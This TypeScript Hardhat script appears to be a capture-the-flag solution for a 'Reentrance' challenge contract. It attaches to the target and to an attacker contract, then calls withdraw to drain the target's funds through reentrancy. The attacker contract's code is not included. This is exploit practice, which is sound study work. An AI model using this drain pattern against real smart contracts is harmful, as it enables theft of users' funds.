// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const reentranceAddress = "0x4E34A0f8ee0EBAA1293C67a7868076Cb6299426C"
  const reentranceSolvedAddress = "0xBdD6528D3f463DE3a06bDFba29C5B55e11E3B753"
  console.log(deployer.address);

  const ReentranceFactory = await ethers.getContractFactory("Reentrance");
  const ReentranceSolvedFactory = await ethers.getContractFactory("ReentranceSolved");

  const reentrance = ReentranceFactory.attach(reentranceAddress);  
  const reentranceSolved = ReentranceSolvedFactory.attach(reentranceSolvedAddress);  
  
  /* creating the reentrance solved contract and donsting funds to it
  const reentranceSolved = await ReentranceSolvedFactory.deploy(reentranceAddress);
  await reentranceSolved.deployed()
  console.log('reentranceSolved deployed to: ', reentranceSolved.address);

  // donating funds to reentrance
  const tx = await reentrance.donate(
    reentranceSolved.address,  
    { 
    value: parseEther("0.001")
    }
  )
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)
  */
  
  // now withdraw funds via reentrancy
  const balance = await reentrance.balanceOf(reentranceSolved.address)
  const tx = await reentranceSolved.withdraw(balance)
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)
  
  
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
